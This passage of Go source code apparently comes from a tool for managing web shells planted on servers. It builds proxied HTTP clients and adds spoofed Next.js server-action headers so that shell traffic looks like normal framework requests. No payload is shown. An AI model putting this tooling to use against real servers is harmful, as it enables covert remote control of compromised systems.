		if err := h.db.First(&proxyConfig, proxyID).Error; err != nil {
			fmt.Printf("[FileHandler.createHTTPClientWithProxy] ❌ Proxy ID %d not found: %v\n", proxyID, err)
			return transport.NewHTTPClient(), nil
		}
		fmt.Printf("[FileHandler.createHTTPClientWithProxy] 查询到代理配置: %s %s:%d, Enabled: %v\n", proxyConfig.Type, proxyConfig.Host, proxyConfig.Port, proxyConfig.Enabled)
		if !proxyConfig.Enabled {
			fmt.Printf("[FileHandler.createHTTPClientWithProxy] ⚠️  Proxy ID %d is disabled, 不使用代理\n", proxyID)
			return transport.NewHTTPClient(), nil
		}
		fmt.Printf("[FileHandler.createHTTPClientWithProxy] ✅ 使用代理: %s %s:%d (用户名: %s)\n", proxyConfig.Type, proxyConfig.Host, proxyConfig.Port, proxyConfig.Username)
		proxyCfg := &proxy.ProxyConfig{
			Type:     proxyConfig.Type,
			Host:     proxyConfig.Host,
			Port:     proxyConfig.Port,
			Username: proxyConfig.Username,
			Password: proxyConfig.Password,
		}
		client, err := transport.NewHTTPClientWithProxy(proxyCfg)
		if err != nil {
			fmt.Printf("[FileHandler.createHTTPClientWithProxy] ❌ 创建代理客户端失败: %v\n", err)
			return nil, err
		}
		fmt.Printf("[FileHandler.createHTTPClientWithProxy] ✅ 代理客户端创建成功\n")
		return client, nil
	}
	fmt.Printf("[FileHandler.createHTTPClientWithProxy] ⚠️  ProxyID为0，不使用代理\n")
	return transport.NewHTTPClient(), nil
}

func (h *FileHandler) getCustomHeaders(shell *database.Shell) map[string]string {
	var customHeaders map[string]string
	if shell.CustomHeaders != "" {
		json.Unmarshal([]byte(shell.CustomHeaders), &customHeaders)
	}
	if customHeaders == nil {
		customHeaders = make(map[string]string)
	}
	if shell.Protocol == "multipart" {
		if customHeaders["Next-Action"] == "" {
			customHeaders["Next-Action"] = "x"
		}
		if customHeaders["X-Nextjs-Request-Id"] == "" {
			customHeaders["X-Nextjs-Request-Id"] = uuid.New().String()[:8]
		}
		if customHeaders["X-Nextjs-Html-Request-Id"] == "" {
			customHeaders["X-Nextjs-Html-Request-Id"] = uuid.New().String()[:16]
		}
	}
	return customHeaders
}
